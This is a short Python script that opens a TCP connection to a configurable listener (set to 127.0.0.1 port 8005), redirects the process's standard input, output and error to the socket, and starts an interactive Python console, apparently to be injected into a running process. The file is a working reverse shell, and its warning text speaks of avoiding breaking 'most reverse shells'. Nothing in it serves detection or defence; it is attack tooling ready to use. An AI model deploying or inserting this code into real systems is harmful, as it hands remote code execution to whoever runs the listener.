import socket
import os
import code
import traceback


# DEFINE HOST AND PORT
REMOTE_ADDR='127.0.0.1'
PORT=8005


# CONNECT TO TCP LISTENER
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((REMOTE_ADDR, PORT))


# SAVE CURRENT IO FILE DESCRIPTORS TO RESET LATER
prev0=os.dup(0)
prev1=os.dup(1)
prev2=os.dup(2)


# REDIRECT STDIN, STDOUT, AND STDERR TO SOCKET
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)


# CREATE INTERACTIVE CONSOLE OBJECT
shell=code.InteractiveConsole(globals().copy().update(locals()))


# WARNING LABELS ARE IMPORTANT
print()
print()
print('!!!WARNING!!! DO NOT EXIT THIS PROMPT WITH exit(), quit(), or ^D. Raise SystemExit instead. InteractiveConsole contains an open bug in which it closes <STDIN> when exit(), quit(), or ^D are used. This will prevent the use of most reverse shells until the application is restarted. In some cases, this may also cause a Denial of Service. BE EXTRA CAREFUL TO EXIT THIS PROMPT BY MANUALLY RAISING SystemExit.')
print()
print()


# LAUNCH INTERACTIVE CONSOLE
try:
    shell.interact()
except:
    traceback.print_exc()


# REDIRECT STDIN, STDOUT, AND STDERR BACK TO WHERE THEY WERE, AND CLOSE
os.dup2(prev0,0)
os.close(prev0)
os.dup2(prev1,1)
os.close(prev1)
os.dup2(prev2,2)
os.close(prev2)